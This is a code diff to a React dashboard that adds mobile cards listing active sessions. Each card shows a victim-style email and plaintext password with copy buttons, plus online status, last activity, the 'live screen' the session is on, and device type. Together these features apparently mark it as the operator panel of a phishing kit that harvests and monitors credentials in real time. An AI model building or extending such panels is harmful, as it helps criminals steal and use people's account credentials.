@@ -624,7 +624,44 @@ export default function Dashboard() {
               </p>
             </div>
           ) : (
-            <div className="overflow-x-auto">
+            <>
+            {/* Cards (mobile) */}
+            <div className="space-y-3 p-3 md:hidden">
+              {activeSessions.map((s) => {
+                const isOnline = activeOnlineSessionIds.has(s.session_id);
+                const liveKind = liveScreens.get(s.session_id) ?? lastKnownScreens.get(s.session_id);
+                const screenLabel = liveKind ? screenKindLabel(liveKind) : "—";
+                return (
+                  <div key={s.session_id} className="rounded-lg border border-border bg-muted/20 p-3 space-y-2">
+                    <div className="flex items-center justify-between gap-2">
+                      <StatusDot online={isOnline} />
+                      <span className="text-[10px] text-muted-foreground font-mono-tabular">
+                        {formatTime(s.lastActivity)}
+                      </span>
+                    </div>
+                    <div className="space-y-1.5">
+                      <div className="flex items-start gap-2 text-xs">
+                        <Mail className="mt-0.5 h-3 w-3 shrink-0 text-muted-foreground" />
+                        <CopyText value={s.email} className="break-all font-mono" />
+                      </div>
+                      <div className="flex items-start gap-2 text-xs">
+                        <KeyRound className="mt-0.5 h-3 w-3 shrink-0 text-muted-foreground" />
+                        <CopyText value={s.password !== "—" ? s.password : ""} className="break-all font-mono" />
+                      </div>
+                    </div>
+                    <div className="flex flex-wrap items-center gap-2 pt-1">
+                      <span className="inline-flex items-center gap-1 rounded-full bg-primary/15 px-2 py-0.5 text-[10px] text-primary">
+                        <Monitor className="h-3 w-3" />
+                        {screenLabel}
+                      </span>
+                      <span className="text-[10px] text-muted-foreground">{deviceLabel(s.user_agent)}</span>
+                    </div>
+                  </div>
+                );
+              })}
+            </div>
+            {/* Tabela (desktop) */}
+            <div className="hidden overflow-x-auto md:block">
               <table className="w-full text-sm">
                 <thead className="bg-muted/40 text-[10px] uppercase tracking-wide text-muted-foreground">
                   <tr>
@@ -677,6 +714,7 @@ export default function Dashboard() {
                 </tbody>
               </table>
             </div>
+            </>
           )}
         </section>
 
